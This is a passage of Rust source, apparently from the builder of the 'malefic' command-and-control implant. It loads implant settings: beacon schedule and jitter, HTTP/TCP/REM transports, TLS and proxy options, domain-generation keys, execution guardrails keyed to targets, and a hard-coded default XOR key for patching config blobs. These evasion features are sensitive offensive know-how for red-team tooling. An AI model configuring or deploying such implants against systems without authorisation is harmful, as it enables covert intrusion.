        #[serde(default)]
        require_all: bool,
    }

    #[derive(serde::Deserialize)]
    struct MTLSConfigFile {
        enable: bool,
        #[serde(default)]
        client_cert: Vec<u8>,
        #[serde(default)]
        client_key: Vec<u8>,
        #[serde(default)]
        server_ca: Vec<u8>,
    }

    #[derive(serde::Deserialize)]
    struct TlsConfigFile {
        enable: bool,
        #[serde(default)]
        version: String,
        #[serde(default)]
        sni: String,
        #[serde(default)]
        skip_verification: bool,
        #[serde(default)]
        server_ca: Option<Vec<u8>>,
        #[serde(default)]
        mtls_config: Option<MTLSConfigFile>,
    }

    #[derive(serde::Deserialize)]
    struct ProxyConfigFile {
        proxy_type: String,
        host: String,
        port: u16,
        #[serde(default)]
        username: String,
        #[serde(default)]
        password: String,
    }

    #[derive(serde::Deserialize)]
    struct SessionConfigFile {
        #[serde(default)]
        read_chunk_size: Option<usize>,
        #[serde(default)]
        deadline_ms: Option<u64>,
        #[serde(default)]
        connect_timeout_ms: Option<u64>,
        #[serde(default)]
        keepalive: Option<bool>,
    }

    #[derive(serde::Deserialize)]
    #[serde(tag = "kind", rename_all = "lowercase")]
    enum TransportConfigFile {
        Tcp,
        Http {
            method: String,
            path: String,
            version: String,
            #[serde(default)]
            headers: std::collections::HashMap<String, String>,
            #[serde(default)]
            response_read_chunk_size: Option<usize>,
            #[serde(default)]
            response_retry_delay_ms: Option<u64>,
        },
        Rem {
            link: String,
        },
    }

    #[derive(serde::Deserialize)]
    struct ServerConfigFile {
        address: String,
        protocol: String,
        transport_config: TransportConfigFile,
        #[serde(default)]
        tls_config: Option<TlsConfigFile>,
        #[serde(default)]
        proxy_config: Option<ProxyConfigFile>,
        #[serde(default)]
        domain_suffix: Option<String>,
        #[serde(default)]
        session_config: Option<SessionConfigFile>,
    }

    #[derive(serde::Deserialize)]
    struct RuntimeConfigFile {
        cron: String,
        jitter: f64,
        #[serde(default)]
        keepalive: bool,
        retry: u32,
        max_cycles: i32,
        name: String,
        key: KeyField,
        #[serde(default)]
        use_env_proxy: bool,
        #[serde(default)]
        proxy_url: String,
        #[serde(default)]
        proxy_scheme: String,
        #[serde(default)]
        proxy_host: String,
        #[serde(default)]
        proxy_port: String,
        #[serde(default)]
        proxy_username: String,
        #[serde(default)]
        proxy_password: String,
        #[serde(default)]
        dga_enable: bool,
        #[serde(default)]
        dga_key: String,
        #[serde(default)]
        dga_interval_hours: u32,
        guardrail: GuardrailConfigFile,
        server_configs: Vec<ServerConfigFile>,
        #[serde(default)]
        max_packet_length: usize,
    }

    use malefic_config::{
        GuardrailConfig as CoreGuardrailConfig, HttpRequestConfig as CoreHttpRequestConfig,
        MTLSConfig as CoreMtlsConfig, ProtocolType as CoreProtocolType,
        ProxyConfig as CoreProxyConfig, RemConfig as CoreRemConfig,
        RuntimeConfig as CoreRuntimeConfig, ServerConfig as CoreServerConfig,
        SessionConfig as CoreSessionConfig, TcpConfig as CoreTcpConfig, TlsConfig as CoreTlsConfig,
        TransportConfig as CoreTransportConfig,
    };

    fn apply_session_config(
        mut session_config: CoreSessionConfig,
        session_override: Option<SessionConfigFile>,
    ) -> CoreSessionConfig {
        if let Some(session_override) = session_override {
            if let Some(read_chunk_size) = session_override.read_chunk_size {
                session_config.read_chunk_size = read_chunk_size;
            }
            if let Some(deadline_ms) = session_override.deadline_ms {
                session_config.deadline = Duration::from_millis(deadline_ms);
            }
            if let Some(connect_timeout_ms) = session_override.connect_timeout_ms {
                session_config.connect_timeout = Duration::from_millis(connect_timeout_ms);
            }
            if let Some(keepalive) = session_override.keepalive {
                session_config.keepalive = keepalive;
            }
        }
        session_config
    }

    let text = fs::read_to_string(path)
        .with_context(|| format!("failed to read runtime config file '{}'", path))?;

    // Try JSON first, then YAML
    let parsed: RuntimeConfigFile = serde_json::from_str(&text)
        .or_else(|_| serde_yaml::from_str(&text))
        .map_err(|_| {
            anyhow::anyhow!(
                "failed to parse runtime config file '{}' as JSON or YAML",
                path
            )
        })?;

    let guardrail = CoreGuardrailConfig {
        ip_addresses: parsed.guardrail.ip_addresses,
        usernames: parsed.guardrail.usernames,
        server_names: parsed.guardrail.server_names,
        domains: parsed.guardrail.domains,
        require_all: parsed.guardrail.require_all,
    };
    let default_keepalive = parsed.keepalive;

    let mut server_configs = Vec::new();
    for server in parsed.server_configs {
        let protocol = match server.protocol.to_lowercase().as_str() {
            "tcp" => CoreProtocolType::Tcp,
            "http" => CoreProtocolType::Http,
            "rem" => CoreProtocolType::REM,
            _ => {
                return Err(anyhow::anyhow!(
                    "invalid protocol '{}' in runtime config",
                    server.protocol
                ))
            }
        };

        let transport_config = match server.transport_config {
            TransportConfigFile::Tcp => CoreTransportConfig::Tcp(CoreTcpConfig {}),
            TransportConfigFile::Rem { link } => CoreTransportConfig::Rem(CoreRemConfig::new(link)),
            TransportConfigFile::Http {
                method,
                path,
                version,
                headers,
                response_read_chunk_size,
                response_retry_delay_ms,
            } => {
                let mut http = CoreHttpRequestConfig::new(&method, &path, &version);
                http.headers = headers;
                if let Some(response_read_chunk_size) = response_read_chunk_size {
                    http.response_read_chunk_size = response_read_chunk_size;
                }
                if let Some(response_retry_delay_ms) = response_retry_delay_ms {
                    http.response_retry_delay = Duration::from_millis(response_retry_delay_ms);
                }
                CoreTransportConfig::Http(http)
            }
        };
        let session_config = apply_session_config(
            CoreSessionConfig::default_for_transport(&transport_config, default_keepalive),
            server.session_config,
        );

        let tls_config = server.tls_config.map(|tls| CoreTlsConfig {
            enable: tls.enable,
            version: tls.version,
            sni: tls.sni,
            skip_verification: tls.skip_verification,
            server_ca: tls.server_ca.unwrap_or_default(),
            mtls_config: tls.mtls_config.map(|m| CoreMtlsConfig {
                enable: m.enable,
                client_cert: m.client_cert,
                client_key: m.client_key,
                server_ca: m.server_ca,
            }),
        });

        let proxy_config = server.proxy_config.map(|p| CoreProxyConfig {
            proxy_type: p.proxy_type,
            host: p.host,
            port: p.port,
            username: p.username,
            password: p.password,
        });

        server_configs.push(CoreServerConfig {
            address: server.address,
            protocol,
            session_config,
            transport_config,
            tls_config,
            proxy_config,
            domain_suffix: server.domain_suffix,
        });
    }

    Ok(CoreRuntimeConfig {
        cron: parsed.cron,
        jitter: parsed.jitter,
        keepalive: parsed.keepalive,
        retry: parsed.retry,
        max_cycles: parsed.max_cycles,
        name: parsed.name,
        key: parsed.key.into_bytes(),
        use_env_proxy: parsed.use_env_proxy,
        proxy_url: parsed.proxy_url,
        proxy_scheme: parsed.proxy_scheme,
        proxy_host: parsed.proxy_host,
        proxy_port: parsed.proxy_port,
        proxy_username: parsed.proxy_username,
        proxy_password: parsed.proxy_password,
        dga_enable: parsed.dga_enable,
        dga_key: parsed.dga_key,
        dga_interval_hours: parsed.dga_interval_hours,
        guardrail,
        server_configs,
        max_packet_length: parsed.max_packet_length,
    })
}

/// Read a value as PEM content or as a file path.
/// If the string starts with "-----BEGIN" it's treated as inline PEM content.
/// Otherwise it's treated as a file path and read from disk.
fn read_pem_or_file(value: &str) -> Vec<u8> {
    if value.is_empty() {
        return Vec::new();
    }
    if value.starts_with("-----BEGIN") {
        value.as_bytes().to_vec()
    } else {
        std::fs::read(value).unwrap_or_default()
    }
}

fn convert_implant_to_runtime_config(
    implant: &Implant,
) -> anyhow::Result<malefic_config::RuntimeConfig> {
    use malefic_config::{
        GuardrailConfig as CoreGuardrailConfig, HttpRequestConfig as CoreHttpRequestConfig,
        MTLSConfig as CoreMtlsConfig, ProtocolType as CoreProtocolType,
        ProxyConfig as CoreProxyConfig, RuntimeConfig as CoreRuntimeConfig,
        ServerConfig as CoreServerConfig, SessionConfig as CoreSessionConfig,
        TlsConfig as CoreTlsConfig, TransportConfig as CoreTransportConfig,
    };
    use url::Url;

    let basic = &implant.basic;

    let mut server_configs = Vec::new();
    for target in &basic.targets {
        let protocol = if target.http.is_some() {
            CoreProtocolType::Http
        } else if target.rem.is_some() {
            CoreProtocolType::REM
        } else {
            CoreProtocolType::Tcp
        };

        let transport_config = match (&target.http, &target.rem) {
            (Some(http), _) => {
                let mut config =
                    CoreHttpRequestConfig::new(&http.method, &http.path, &http.version);
                config.headers = http.headers.clone();
                if let Some(response_read_chunk_size) = http.response_read_chunk_size {
                    config.response_read_chunk_size = response_read_chunk_size;
                }
                if let Some(response_retry_delay_ms) = http.response_retry_delay_ms {
                    config.response_retry_delay = Duration::from_millis(response_retry_delay_ms);
                }
                CoreTransportConfig::Http(config)
            }
            (_, Some(rem)) => {
                CoreTransportConfig::Rem(malefic_config::RemConfig::new(rem.link.clone()))
            }
            _ => CoreTransportConfig::Tcp(malefic_config::TcpConfig {}),
        };
        let mut session_config =
            CoreSessionConfig::default_for_transport(&transport_config, basic.keepalive);
        if let Some(session) = &target.session {
            if let Some(read_chunk_size) = session.read_chunk_size {
                session_config.read_chunk_size = read_chunk_size;
            }
            if let Some(deadline_ms) = session.deadline_ms {
                session_config.deadline = Duration::from_millis(deadline_ms);
            }
            if let Some(connect_timeout_ms) = session.connect_timeout_ms {
                session_config.connect_timeout = Duration::from_millis(connect_timeout_ms);
            }
            if let Some(keepalive) = session.keepalive {
                session_config.keepalive = keepalive;
            }
        }

        let tls_config = target.tls.as_ref().map(|tls| CoreTlsConfig {
            enable: tls.enable,
            version: tls.version.clone(),
            sni: tls.sni.clone(),
            skip_verification: tls.skip_verification,
            server_ca: tls
                .server_ca
                .as_ref()
                .map(|v| read_pem_or_file(v))
                .unwrap_or_default(),
            mtls_config: tls.mtls.as_ref().map(|m| CoreMtlsConfig {
                enable: m.enable,
                client_cert: read_pem_or_file(&m.client_cert),
                client_key: read_pem_or_file(&m.client_key),
                server_ca: read_pem_or_file(&m.server_ca),
            }),
        });

        let proxy_config = target.proxy.as_ref().and_then(|p| {
            if p.url.is_empty() {
                None
            } else {
                Url::parse(&p.url).ok().map(|u| CoreProxyConfig {
                    proxy_type: u.scheme().to_string(),
                    host: u.host_str().unwrap_or_default().to_string(),
                    port: u.port().unwrap_or(0),
                    username: u.username().to_string(),
                    password: u.password().unwrap_or_default().to_string(),
                })
            }
        });

        server_configs.push(CoreServerConfig {
            address: target.address.clone(),
            protocol,
            session_config,
            transport_config,
            tls_config,
            proxy_config,
            domain_suffix: target.domain_suffix.clone(),
        });
    }

    let guardrail = &basic.guardrail;
    let guardrail_cfg = CoreGuardrailConfig {
        ip_addresses: guardrail.ip_addresses.clone(),
        usernames: guardrail.usernames.clone(),
        server_names: guardrail.server_names.clone(),
        domains: guardrail.domains.clone(),
        require_all: guardrail.require_all,
    };

    // parse global proxy URL into components
    let mut proxy_scheme = String::new();
    let mut proxy_host = String::new();
    let mut proxy_port = String::new();
    if !basic.proxy.url.is_empty() {
        if let Ok(url) = Url::parse(&basic.proxy.url) {
            proxy_scheme = url.scheme().to_string();
            if let Some(host) = url.host_str() {
                proxy_host = host.to_string();
            }
            proxy_port = url
                .port_or_known_default()
                .map(|p| p.to_string())
                .unwrap_or_default();
        }
    }

    Ok(CoreRuntimeConfig {
        cron: basic.cron.clone(),
        jitter: basic.jitter,
        keepalive: basic.keepalive,
        retry: basic.retry,
        max_cycles: basic.max_cycles.unwrap_or(-1),
        name: basic.name.clone(),
        key: basic.key.as_bytes().to_vec(),
        use_env_proxy: basic.proxy.use_env_proxy,
        proxy_url: basic.proxy.url.clone(),
        proxy_scheme,
        proxy_host,
        proxy_port,
        proxy_username: String::new(),
        proxy_password: String::new(),
        dga_enable: basic.dga.enable,
        dga_key: basic.dga.key.clone(),
        dga_interval_hours: basic.dga.interval_hours,
        guardrail: guardrail_cfg,
        server_configs,
        max_packet_length: basic.max_packet_length,
    })
}

fn normalize_blob_string(raw: &str, expected_len: usize) -> anyhow::Result<String> {
    const PREFIX: &str = "CFGv3B64";

    let cleaned: String = raw.chars().filter(|c| !c.is_whitespace()).collect();
    let mut normalized = if cleaned.starts_with(PREFIX) {
        cleaned
    } else {
        let mut out = String::with_capacity(PREFIX.len() + cleaned.len());
        out.push_str(PREFIX);
        out.push_str(&cleaned);
        out
    };

    if normalized.len() > expected_len {
        return Err(anyhow::anyhow!(
            "provided blob is too long: {} bytes (expected {})",
            normalized.len(),
            expected_len
        ));
    }

    if normalized.len() < expected_len {
        normalized.extend(std::iter::repeat('#').take(expected_len - normalized.len()));
    }

    Ok(normalized)
}

fn resolve_patch_xor_key(cli_value: Option<&str>) -> anyhow::Result<String> {
    if let Some(value) = cli_value {
        return Ok(value.to_string());
    }

    if let Some(key) = read_key_from_implant_yaml()? {
        if !key.is_empty() {
            return Ok(key);
        }
    }

    Ok("maliceofinternal".to_string())
}

fn read_key_from_implant_yaml() -> anyhow::Result<Option<String>> {
    let path = Path::new("implant.yaml");
    if !path.exists() {
        return Ok(None);
    }

    let yaml_content = fs::read_to_string(path)?;
    let yaml_value: YamlValue = serde_yaml::from_str(&yaml_content)?;
    Ok(yaml_value
        .get("basic")
        .and_then(|basic| basic.get("key"))
        .and_then(|key| key.as_str())
        .map(|value| value.to_string()))
}

fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();
    logger::init(cli.debug);
    match &cli.command {
        Commands::Generate {
            version,
            config,
            command,
            source,
            patch_mode,
            metadata_wordlist,
        } => {
            let mut implant_config = load_yaml_config(config)?;
            validate_yaml_config(config)?;
            parse_generate(
                &mut implant_config,
                command,
                *version,
                *patch_mode,
                *source,
                metadata_wordlist.as_deref(),
            )
        }
        Commands::Build {
            config,
            target,
            lib,
            dev,
            command,
        } => {
            let mut implant_config = load_yaml_config(config)?;
            validate_yaml_config(config)?;
            parse_build(&mut implant_config, command, target, *lib, *dev)
        }
        Commands::Tool(tool) => parse_tool(tool),
    }
}
